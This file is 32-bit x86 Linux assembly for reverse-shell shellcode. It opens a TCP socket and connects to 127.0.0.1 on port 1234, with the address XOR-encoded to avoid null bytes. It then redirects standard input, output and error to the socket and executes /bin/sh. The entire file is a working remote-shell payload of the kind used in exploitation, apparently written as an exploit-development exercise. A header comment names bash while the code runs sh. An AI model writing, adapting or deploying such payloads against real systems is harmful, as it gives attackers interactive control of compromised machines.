BITS 32

; socketcall(SYS_SOCKET, (AF_INET,SOCK_STREAM,IP_PROTO))
; socketcall(SYS_CONNECT, (sockfd,struct sockaddr*,addrlen)
; dup2(sockfd, std*)
; execve('/bin/bash',0,0)

; socket syscall
; syscall number
push 0x66
pop eax
; SYS_SOCKET=1
xor ebx,ebx
inc ebx
; arg struct
; IP_PROTO=0
xor edx,edx
push edx
; SOCK_STREAM=1
push ebx
; AF_INET=2
push 0x2
; struct address
mov ecx,esp
; syscall
int 0x80
xchg eax,edx

; connect syscall
; syscall number
push 0x66
pop eax
; SYS_CONNECT=3
push 0x3
pop ebx
; sockaddr struct
; sin_addr=inet_aton('127.0.0.1'), XORed with 0xffffffff
mov ecx,0xfeffff80
xor ecx,0xffffffff
push ecx
; sin_port=1234 (big endian)
push word 0xd204
; AF_INET=2
push word 0x2
mov ecx,esp
; arg struct
; addrlen
push 0x10
; struct sockaddr
push ecx
; sockfd
push edx
mov ecx,esp
; syscall
int 0x80

; dup2 syscall loop
; init fd to 0 for looping
xor ecx,ecx
; sockfd
mov ebx,edx
_loop:
push 0x3f
; syscall number
pop eax
int 0x80
inc ecx
cmp ecx,3
jle _loop

; execve syscall
jmp short _one

_two:
pop ebx
xor eax, eax
mov al, 0xb
xor ecx, ecx
xor edx, edx
int 0x80

mov al, 0x1
xor ebx, ebx
int 0x80

_one:
call _two
db '/bin/sh'

